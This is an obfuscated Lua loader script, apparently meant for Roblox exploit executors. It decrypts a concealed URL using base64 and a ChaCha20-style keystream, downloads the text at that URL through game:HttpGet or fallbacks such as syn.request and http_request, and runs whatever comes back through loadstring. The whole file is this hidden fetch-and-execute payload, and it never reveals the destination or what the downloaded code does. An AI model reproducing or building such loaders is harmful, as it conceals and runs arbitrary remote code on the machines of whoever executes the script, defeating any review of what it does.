local naCkgTb={577953151,3634159359,1765821397,3149693290,2645690371,152763508,3308962244,1693069579}
local QzAZqcFjE={180807405,2091903699,2900425959}
local jBYdRBfx={"bA0jc7BzJkgzZ8X","MI6FtW7D6Rfe","4=","bjyLXGpMin","4UQ+c11HRFzO4D","nCpBPR9Um8kwil","PHxFR+Bog4enjqr39"}
local arnMrUXRF={1,5,7,6,2,4,3}
local yVugZZe=bit32
if type(yVugZZe)~="table" or type(yVugZZe.bxor)~="function" or type(yVugZZe.lrotate)~="function" then error("Unsupported",0) end
local PKhwaUQHD=4294967296
local PDcKVVaUW=math.floor
local function rxdZBYtz(v,a,b,c,d)
 v[a]=(v[a]+v[b])%PKhwaUQHD;v[d]=yVugZZe.lrotate(yVugZZe.bxor(v[d],v[a]),16)
 v[c]=(v[c]+v[d])%PKhwaUQHD;v[b]=yVugZZe.lrotate(yVugZZe.bxor(v[b],v[c]),12)
 v[a]=(v[a]+v[b])%PKhwaUQHD;v[d]=yVugZZe.lrotate(yVugZZe.bxor(v[d],v[a]),8)
 v[c]=(v[c]+v[d])%PKhwaUQHD;v[b]=yVugZZe.lrotate(yVugZZe.bxor(v[b],v[c]),7)
end
local function FMjtSCJy(counter)
 local v={1634760805,857760878,2036477234,1797285236,naCkgTb[1],naCkgTb[2],naCkgTb[3],naCkgTb[4],naCkgTb[5],naCkgTb[6],naCkgTb[7],naCkgTb[8],counter,QzAZqcFjE[1],QzAZqcFjE[2],QzAZqcFjE[3]}
 local w={}
 for i=1,16 do w[i]=v[i] end
 for _=1,10 do
  rxdZBYtz(w,1,5,9,13);rxdZBYtz(w,2,6,10,14);rxdZBYtz(w,3,7,11,15);rxdZBYtz(w,4,8,12,16)
  rxdZBYtz(w,1,6,11,16);rxdZBYtz(w,2,7,12,13);rxdZBYtz(w,3,8,9,14);rxdZBYtz(w,4,5,10,15)
 end
 local out={}
 for i=1,16 do
  local n=(w[i]+v[i])%PKhwaUQHD
  out[#out+1]=n%256;out[#out+1]=PDcKVVaUW(n/256)%256;out[#out+1]=PDcKVVaUW(n/65536)%256;out[#out+1]=PDcKVVaUW(n/16777216)%256
 end
 return out
end
local function cRnpeUy()
 local joined={}
 for i=1,#arnMrUXRF do joined[i]=jBYdRBfx[arnMrUXRF[i]] end
 local data=table.concat(joined)
 local alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 local lookup={}
 for i=1,#alphabet do lookup[string.byte(alphabet,i)]=i-1 end
 lookup[61]=0
 local decoded={}
 for p=1,#data,4 do
  local a,b,c,d=string.byte(data,p,p+3)
  if not d then error("Invalid",0) end
  local n=lookup[a]*262144+lookup[b]*4096+lookup[c]*64+lookup[d]
  decoded[#decoded+1]=PDcKVVaUW(n/65536)%256
  if c~=61 then decoded[#decoded+1]=PDcKVVaUW(n/256)%256 end
  if d~=61 then decoded[#decoded+1]=n%256 end
 end
 if #decoded~=62 then error("Invalid",0) end
 local output={}
 for off=1,#decoded,64 do
  local stream=FMjtSCJy(1+PDcKVVaUW((off-1)/64))
  for j=1,math.min(64,#decoded-off+1) do
   output[#output+1]=string.char(yVugZZe.bxor(decoded[off+j-1],stream[j]))
  end
 end
 local url=table.concat(output)
 if url:sub(1,8)~="https://" then error("Invalid",0) end
 return url
end
local function BaxugcAyVa(body)
 if type(body)~="string" or #body==0 or #body>8388608 then return nil end
 local loader=loadstring or load
 if type(loader)~="function" then return nil end
 local ok,fn=pcall(loader,body)
 if ok and type(fn)=="function" then return fn end
end
local function PwTKXNzg(req,url)
 if type(req)~="function" then return nil end
 local ok,res=pcall(req,{Url=url,Method="GET",Headers={Accept="text/plain"}})
 if not ok or type(res)~="table" then return nil end
 local status=tonumber(res.StatusCode or res.Status or res.status)
 if status~=200 and not(status==nil and res.Success==true) then return nil end
 return BaxugcAyVa(res.Body or res.body)
end
local url=cRnpeUy()
local fn
local ok,body=pcall(function() return game:HttpGet(url,true) end)
if ok then fn=BaxugcAyVa(body) end
if not fn then
 local clients={}
 local function add(x) if type(x)=="function" then clients[#clients+1]=x end end
 add(request);add(http_request)
 if type(syn)=="table" then add(syn.request) end
 if type(http)=="table" then add(http.request) end
 local seen={}
 for _,req in ipairs(clients) do
  if type(req)=="function" and not seen[req] then
   seen[req]=true
   fn=PwTKXNzg(req,url)
   if fn then break end
  end
 end
end
if not fn then error("Unavailable",0) end
return fn()
